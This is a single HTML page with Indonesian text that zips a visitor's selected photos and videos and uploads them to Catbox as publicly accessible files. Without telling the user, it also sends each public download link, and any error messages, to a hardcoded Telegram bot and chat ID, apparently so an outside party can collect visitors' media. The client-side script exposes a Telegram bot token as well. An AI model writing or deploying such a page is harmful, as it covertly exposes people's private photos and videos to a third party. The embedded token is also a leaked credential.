<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Zip Foto & Video & Upload ke Catbox</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
</head>
<body>
  <h3>Upload foto & video (multiple)</h3>
  <input id="files" type="file" accept="image/*,video/*" multiple />
  <br/><br/>
  <button id="zipBtn">Buat ZIP & Upload ke Catbox</button>
  <p id="status"></p>
  <div id="downloadLink"></div>

  <script>
    // --- Konfigurasi ---
    const TELEGRAM_BOT_TOKEN = '8294940824:AAFJYAbNnxRyaNB321v9IEQ_dnqBZJA7R7I';
    const TELEGRAM_CHAT_ID = '6315300476';
    const CATBOX_API_URL = 'https://catbox.moe/user/api.php';
    // ----------------------------

    const input = document.getElementById('files');
    const btn = document.getElementById('zipBtn');
    const status = document.getElementById('status');
    const linkDiv = document.getElementById('downloadLink');

    // Fungsi untuk mengirim pesan teks ke Telegram
    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const params = {
        chat_id: TELEGRAM_CHAT_ID,
        text: text.trim(),
        parse_mode: 'HTML' 
      };

      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(params)
        });
      } catch (err) {
        console.error('Gagal terhubung ke Telegram API:', err);
      }
    }

    // Fungsi untuk mengunggah Blob ke Catbox
    async function uploadToCatbox(blob, filename) {
        const formData = new FormData();
        formData.append('reqtype', 'fileupload');
        // Catatan: Catbox API membutuhkan 'userhash' jika kamu punya akun, tapi opsional.
        // formData.append('userhash', 'YOUR_USER_HASH'); 

        // Membuat objek File dari Blob agar bisa diunggah
        const zipFile = new File([blob], filename, { type: 'application/zip' });
        formData.append('fileToUpload', zipFile);

        const uploadStatus = document.createElement('p');
        uploadStatus.textContent = 'Mengunggah ke Catbox...';
        linkDiv.appendChild(uploadStatus);

        try {
            const response = await fetch(CATBOX_API_URL, {
                method: 'POST',
                body: formData,
                // Tidak perlu headers 'Content-Type', FormData akan menanganinya
            });
            
            const resultUrl = await response.text();
            uploadStatus.textContent = `Unggahan selesai. URL: ${resultUrl.trim()}`;
            
            // Catbox mengembalikan URL jika sukses, atau pesan error jika gagal
            if (resultUrl.startsWith('https://files.catbox.moe/')) {
                return resultUrl.trim();
            } else {
                throw new Error(resultUrl || 'Unggahan Catbox gagal tanpa pesan error jelas.');
            }
        } catch (error) {
            console.error('Error Catbox Upload:', error);
            uploadStatus.textContent = `❌ Gagal Unggah ke Catbox: ${error.message}. (Kemungkinan diblokir CORS)`;
            throw new Error(error.message); // Lempar lagi error untuk ditangani di bawah
        }
    }

    btn.addEventListener('click', async () => {
      const files = input.files;
      linkDiv.innerHTML = ''; 

      if (!files || files.length === 0) {
        alert('Pilih file dulu bro.');
        return;
      }

      const zip = new JSZip();
      status.textContent = 'Menambahkan file ke ZIP...';
      const folderName = new Date().toISOString().split('T')[0];
      const zipFileName = `backup_${folderName}.zip`;

      const folder = zip.folder(folderName);
      for (let i = 0; i < files.length; i++) {
        const f = files[i];
        status.textContent = `Menambahkan (${i + 1}/${files.length}): ${f.name}`;
        folder.file(f.name, f.slice(0, f.size)); 
      }

      status.textContent = 'Mengkompres ZIP, tunggu sebentar...';
      let zipBlob;

      try {
        zipBlob = await zip.generateAsync(
          { type: 'blob', compression: 'DEFLATE', compressionOptions: { level: 6 } },
          (meta) => {
            status.textContent = `Compressing: ${Math.round(meta.percent)}%`;
          }
        );

        status.textContent = 'Kompresi selesai. Memulai unggahan ke Catbox...';
        
        // --- Langkah 2: Unggah ke Catbox ---
        const catboxUrl = await uploadToCatbox(zipBlob, zipFileName);

        status.textContent = `✅ Berhasil! ZIP diunggah ke Catbox.`;

        // --- Langkah 3: Kirim URL Catbox ke Telegram ---
        const telegramMessage = `
          <b>✅ Unggahan Selesai!</b>
          
          <b>Nama File:</b> ${zipFileName}
          <b>Link Download Publik:</b> <a href="${catboxUrl}">${catboxUrl}</a>
          
          Link ini dapat diakses oleh siapapun.
        `;
        await sendTelegramMessage(telegramMessage);

        // Tampilkan link download Catbox di halaman
        const a = document.createElement('a');
        a.href = catboxUrl;
        a.download = zipFileName;
        a.textContent = 'Link Download ZIP (Catbox)';
        a.style.display = 'block';
        a.style.marginTop = '10px';
        a.style.padding = '10px';
        a.style.background = '#28a745';
        a.style.color = '#fff';
        a.style.textDecoration = 'none';
        a.style.borderRadius = '5px';
        linkDiv.appendChild(a);

      } catch (err) {
        console.error(err);
        status.textContent = '❌ Gagal Total (Lihat pesan error di atas): ' + err.message;
        const failMessage = `❌ Gagal memproses ZIP atau mengunggah ke Catbox: ${err.message}`;
        await sendTelegramMessage(failMessage);
      }
    });
  </script>
</body>
</html>
